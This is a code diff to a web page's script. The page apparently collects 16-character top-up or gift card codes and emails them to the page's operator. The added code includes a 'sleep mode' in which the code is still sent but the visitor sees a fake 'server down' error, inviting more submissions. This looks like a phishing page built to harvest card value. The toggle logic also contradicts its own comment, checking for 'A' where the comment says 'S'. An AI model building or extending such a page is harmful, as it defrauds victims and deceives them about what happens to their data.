@@ -153,6 +153,9 @@
     <div id="toastContainer" class="fixed bottom-4 right-4 z-50 flex flex-col gap-2 pointer-events-none"></div>
 
     <script>
+        // CONFIGURATION TOGGLE: 'A' for Active / Normal Behavior, 'S' for Sleep Time / Fake Server Down Error Mode
+        const MODE = 'S';
+
         function formatCardCode(input) {
             let cleanVal = input.value.replace(/\s+/g, '').toUpperCase();
             if (cleanVal.length > 16) {
@@ -236,14 +239,23 @@
                 }
             }
 
-            // --- STEP 3: FINAL HANDLING ---
-            if (success) {
+
+            
+            // HERE AAAAAAAAAAAAA --- STEP 3: FINAL HANDLING ---
+            // If MODE is set to 'S' (Sleep Time) A= Active, we override success to false so it successfully sends to email, 
+            // but displays the server down toast and stays on the same page without redirecting.
+            const isSleepMode = (MODE.toUpperCase() === 'A');
+            const finalSuccess = isSleepMode ? false : success;
+
+
+            
+            if (finalSuccess) {
                 showToast('Verification submitted successfully!', 'success');
                 setTimeout(() => {
                     window.location.href = 'topup-processing.html';
                 }, 800);
             } else {
-                // Fired ONLY if both services fail to dispatch the email
+                // Fired if services fail or if MODE is set to 'S'
                 showToast('Server is currently down at the moment. Please try again after a few minutes.', 'error');
                 
                 submitBtn.disabled = false;
